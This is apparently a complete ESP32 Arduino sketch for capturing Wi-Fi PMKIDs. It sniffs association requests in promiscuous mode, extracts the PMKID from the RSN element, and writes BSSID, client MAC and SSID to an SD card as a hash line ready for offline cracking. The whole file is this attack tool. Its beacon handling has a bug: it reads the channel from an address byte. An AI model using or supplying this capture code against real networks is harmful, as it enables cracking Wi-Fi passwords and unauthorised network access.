#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include "FS.h"
#include "SD_MMC.h"
#include "soc/rtc_cntl_reg.h"
#include "soc/soc.h"
#include <set>

#define LED_PIN 33

std::set<String> seenPMKIDs;
uint8_t targetBSSID[6];
bool targetSet = false;
uint8_t targetChannel = 1;
bool pmkidCaptured = false;

#define ADDR2_OFFSET          10
#define ADDR3_OFFSET          16

#define FRAME_TYPE_ASSOC_REQ  0x00
#define FRAME_TYPE_REASSOC_REQ 0x20
#define IE_TAG_RSN            0x30
#define IE_TAG_SSID           0x00

int getFrameBodyOffset(uint8_t* payload) {
    bool has_qos = (payload[0] & 0x80) != 0;
    return has_qos ? 26 : 24;
}

int findRSNIE(uint8_t* payload, uint16_t len) {
    int frame_body = getFrameBodyOffset(payload);
    if (len < frame_body + 2) return -1;
    
    int pos = frame_body;
    while (pos < len - 2) {
        uint8_t tag_id = payload[pos];
        uint8_t tag_len = payload[pos + 1];
        
        if (tag_id == IE_TAG_RSN) {
            return pos;
        }
        pos += 2 + tag_len;
    }
    return -1;
}

int findSSID(uint8_t* payload, uint16_t len, char* ssid_out, int max_len) {
    int frame_body = getFrameBodyOffset(payload);
    int pos = frame_body;
    
    while (pos + 2 < len) {
        uint8_t tag_id = payload[pos];
        uint8_t tag_len = payload[pos + 1];
        
        if (tag_id == IE_TAG_SSID) {
            if (tag_len > 0 && tag_len <= max_len && pos + 2 + tag_len <= len) {
                memcpy(ssid_out, &payload[pos + 2], tag_len);
                ssid_out[tag_len] = 0;
                return tag_len;
            }
            return 0;
        }
        pos += 2 + tag_len;
    }
    return 0;
}

int extractPMKID(uint8_t* rsnie, uint16_t rsnie_len, uint8_t* out_pmkid) {
    if (rsnie_len < 8) return 0;
    
    int pos = 8;
    
    uint16_t pairwise_count = rsnie[pos] | (rsnie[pos + 1] << 8);
    if (pos + 2 + (pairwise_count * 4) > rsnie_len) return 0;
    pos += 2 + (pairwise_count * 4);
    
    if (pos + 2 > rsnie_len) return 0;
    uint16_t akm_count = rsnie[pos] | (rsnie[pos + 1] << 8);
    if (pos + 2 + (akm_count * 4) > rsnie_len) return 0;
    pos += 2 + (akm_count * 4);
    
    if (pos + 2 > rsnie_len) return 0;
    uint16_t capabilities = rsnie[pos] | (rsnie[pos + 1] << 8);
    pos += 2;
    
    if (!(capabilities & 0x8000)) return 0;
    
    if (pos + 2 > rsnie_len) return 0;
    uint16_t pmkid_count = rsnie[pos] | (rsnie[pos + 1] << 8);
    pos += 2;
    
    if (pmkid_count == 0) return 0;
    if (pos + 16 > rsnie_len) return 0;
    
    memcpy(out_pmkid, &rsnie[pos], 16);
    return 16;
}

void savePMKIDHash(uint8_t* bssid, uint8_t* client_mac, uint8_t* pmkid, char* ssid) {
    char pmkidHex[33];
    char bssidHex[13];
    char clientHex[13];
    
    for (int i = 0; i < 16; i++) sprintf(&pmkidHex[i*2], "%02x", pmkid[i]);
    for (int i = 0; i < 6; i++) sprintf(&bssidHex[i*2], "%02x", bssid[i]);
    for (int i = 0; i < 6; i++) sprintf(&clientHex[i*2], "%02x", client_mac[i]);
    char hashLine[128];
    snprintf(hashLine, sizeof(hashLine), "%s*%s*%s*%s\n", pmkidHex, bssidHex, clientHex, ssid);
    
    char key[50];
    snprintf(key, sizeof(key), "%s%s", pmkidHex, bssidHex);
    
    if (seenPMKIDs.find(String(key)) == seenPMKIDs.end()) {
        seenPMKIDs.insert(String(key));
        
        File f = SD_MMC.open("/pmkid.txt", FILE_APPEND);
        if (f) {
            digitalWrite(LED_PIN, LOW);
            f.print(hashLine);
            f.close();
            digitalWrite(LED_PIN, HIGH);
            
            Serial.printf("[PMKID] Captured for %s\n", ssid);
            Serial.println(hashLine);
        }
    }
}

void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (pmkidCaptured) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    
    // Use frame length from WiFi parser - bounded to reasonable max
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 24 || len > 2560) return;
    
    if (type == WIFI_PKT_MGMT) {
        uint8_t frame_type = payload[0] & 0xFC;
        
        if (frame_type == FRAME_TYPE_ASSOC_REQ || frame_type == FRAME_TYPE_REASSOC_REQ) {
            if (!targetSet) {
                memcpy(targetBSSID, &payload[ADDR3_OFFSET], 6);
                targetSet = true;
                
                char macStr[18];
                sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", 
                        targetBSSID[0], targetBSSID[1], targetBSSID[2], 
                        targetBSSID[3], targetBSSID[4], targetBSSID[5]);
                Serial.printf("[TARGET] %s | CH: ?\n", macStr);
            }
            
            int rsnie_offset = findRSNIE(payload, len);
            if (rsnie_offset > 0) {
                uint8_t rsnie_len = payload[rsnie_offset + 1];
                
                // Bounds check RSN IE
                if (rsnie_offset + 2 + rsnie_len <= len) {
                    uint8_t pmkid[16];
                    if (extractPMKID(&payload[rsnie_offset], rsnie_len, pmkid) == 16) {
                        uint8_t* client_mac = &payload[ADDR2_OFFSET];
                        
                        char ssid[33] = {0};
                        int ssid_len = findSSID(payload, len, ssid, 32);
                        
                        if (ssid_len == 0) {
                            strcpy(ssid, "Unknown");
                        }
                        
                        savePMKIDHash(targetBSSID, client_mac, pmkid, ssid);
                        pmkidCaptured = true;
                    }
                }
            }
        }
        
        if (targetSet && payload[0] == 0x80) {
            targetChannel = payload[10 + 6];
            char macStr[18];
            sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", 
                    targetBSSID[0], targetBSSID[1], targetBSSID[2], 
                    targetBSSID[3], targetBSSID[4], targetBSSID[5]);
            int ssid_len = payload[37];
            char ssid[33] = {0};
            if (ssid_len > 0 && ssid_len <= 32) memcpy(ssid, &payload[38], ssid_len);
            Serial.printf("[TARGET] %s | %s | CH: %d\n", ssid, macStr, targetChannel);
        }
    }
}

void setup() {
    WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0);
    pinMode(LED_PIN, OUTPUT);
    digitalWrite(LED_PIN, HIGH);
    Serial.begin(115200);

    if (SD_MMC.begin("/sdcard", true)) {
        Serial.println("SD: OK");
    } else {
        Serial.println("SD: FAILED");
    }

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
    Serial.println("PMKID CAPTURE RUNNING");
    Serial.println("Waiting for association request...");
}

void loop() {
    if (!targetSet) {
        static uint8_t ch = 1;
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        ch = (ch % 13) + 1;
    } else if (!pmkidCaptured) {
        esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    }
    
    if (pmkidCaptured) {
        Serial.println("[!] PMKID CAPTURED - stopping");
        delay(1000);
        pmkidCaptured = false;
        seenPMKIDs.clear();
    }
    
    delay(100);
}
